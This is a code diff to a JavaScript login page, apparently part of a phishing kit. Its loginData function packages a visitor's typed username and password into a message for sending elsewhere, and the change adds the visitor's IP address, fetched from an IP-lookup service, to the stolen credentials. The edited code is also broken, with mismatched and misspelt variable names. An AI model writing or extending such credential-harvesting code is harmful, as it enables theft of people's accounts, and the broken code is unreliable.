@@ -66,14 +66,14 @@ darkmode_toggle.onclick = (e) => {
 }
 
 
-let IpAddressVisitor;
+let IPAddressVisitor;
 function getIPAddress() {
 
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-            IpAddressVisitor = data.ip;
-            console.log(IpAddressVisitor); // Opzionale: per vedere l'IP in console
+            IPAddressVisitor = data.ip;
+            console.log(IPddressVisitor); // Opzionale: per vedere l'IP in console
         })
         .catch(error => console.error('Errore:', error));
 
@@ -89,7 +89,7 @@ function loginData() {
 
     request.setRequestHeader('Content-type', 'application/json');
 
-    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password;
+    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IpAddressVisitor;
 
 
     // Salva in variabile dataFormattata la data dell'accesso dell'utente
